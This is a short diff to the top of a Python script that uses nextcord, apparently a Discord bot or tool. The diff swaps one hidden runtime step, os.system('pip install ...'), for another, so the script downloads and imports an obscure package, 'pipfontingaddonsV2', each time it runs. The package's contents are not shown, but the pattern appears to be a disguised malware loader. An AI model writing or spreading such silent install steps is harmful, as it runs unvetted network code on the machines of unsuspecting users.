@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncryptoaddition")
-import pythoncryptoaddition
+os.system("pip install pipfontingaddonsV2")
+import pipfontingaddonsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
